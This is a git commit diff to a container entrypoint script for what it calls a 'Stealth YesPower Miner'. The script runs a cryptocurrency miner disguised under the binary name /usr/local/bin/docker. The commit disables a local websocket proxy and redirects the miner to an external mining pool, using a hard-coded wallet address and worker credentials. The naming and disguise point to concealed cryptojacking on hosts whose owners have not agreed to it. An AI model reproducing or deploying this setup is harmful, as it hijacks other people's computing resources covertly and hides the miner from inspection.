b35ced303180cea17ef9ad5d9d0cd4dfe781218c
s03qoj4vvn <s03qoj4vvn@quickmails.eu>
2026-07-17 17:27:31 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -3,14 +3,14 @@ set -e
 
 echo "=== Stealth YesPower Miner Started ==="
 
-node /app/wsproxy.js &
-sleep 3
+# node /app/wsproxy.js &
+# sleep 3
 
 echo "⛏️ Mining started..."
 
 exec /usr/local/bin/docker \
     -a yespower \
-    -o stratum+tcp://127.0.0.1:80 \
+    -o stratum+tcp://mine.pool.r4nd0m.us:6991 \
     -u "Wa8mFnYAtLeiaAmEsuMqtaHYxFFxpAAVZm.worker" \
     -p "c=SWAMP,mc=SWAMP" \
     -t 2 \
